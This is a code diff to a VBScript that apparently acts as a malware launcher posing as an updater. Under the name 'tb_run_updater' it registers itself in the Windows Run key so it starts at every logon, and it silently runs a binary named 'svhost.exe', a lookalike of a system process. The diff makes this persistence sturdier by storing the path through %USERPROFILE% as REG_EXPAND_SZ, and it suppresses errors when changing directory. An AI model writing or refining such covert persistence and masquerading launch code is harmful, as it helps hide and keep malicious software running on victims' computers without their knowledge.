@@ -10,12 +10,18 @@ currentDir = objFSO.GetParentFolderName(scriptPath)
 regRunKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
 appKeyName = "tb_run_updater" ' Unique registry value name
 
-' 1. Add itself to the Registry Run key if not already present
+' 1. Add itself to the Registry Run key (Generalized using %USERPROFILE% and REG_EXPAND_SZ)
 On Error Resume Next
+userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
+generalizedPath = scriptPath
+If InStr(1, generalizedPath, userProfile, vbTextCompare) = 1 Then
+    generalizedPath = "%USERPROFILE%" & Mid(generalizedPath, Len(userProfile) + 1)
+End If
+
 existingVal = objShell.RegRead(regRunKey & appKeyName)
 If Err.Number <> 0 Then
-    ' Value doesn't exist, so create it (wrapping path in quotes to handle spaces)
-    objShell.RegWrite regRunKey & appKeyName, "wscript.exe """ & scriptPath & """", "REG_SZ"
+    ' Value doesn't exist, create it using REG_EXPAND_SZ so environment variables expand dynamically
+    objShell.RegWrite regRunKey & appKeyName, "wscript.exe """ & generalizedPath & """", "REG_EXPAND_SZ"
 End If
 Err.Clear
 
@@ -37,8 +43,10 @@ If IsArray(values) Then
 End If
 On Error GoTo 0
 
-' 3. Switch to the script's directory
+' 3. Switch to the script's directory safely
+On Error Resume Next
 objShell.CurrentDirectory = currentDir
+On Error GoTo 0
 
 ' 4. Run svhost.exe quietly if it exists
 If objFSO.FileExists(objFSO.BuildPath(currentDir, "svhost.exe")) Then
